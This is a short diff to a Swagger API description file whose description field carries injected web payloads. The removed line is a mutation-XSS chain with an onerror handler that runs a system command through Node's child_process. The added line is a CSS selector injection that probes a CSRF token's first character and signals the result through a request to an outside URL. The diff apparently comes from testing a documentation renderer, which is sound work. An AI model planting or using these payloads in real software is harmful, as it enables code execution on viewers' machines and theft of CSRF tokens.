@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |           
-        <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(require('child_process').execSync('calc').toString()) src=1>"></form>
+        <style>input[name=csrf_token][value=^a] {    background-image: url(http://www.google.com.br);}</style>
         
   version: production
 basePath: /JSSResource/
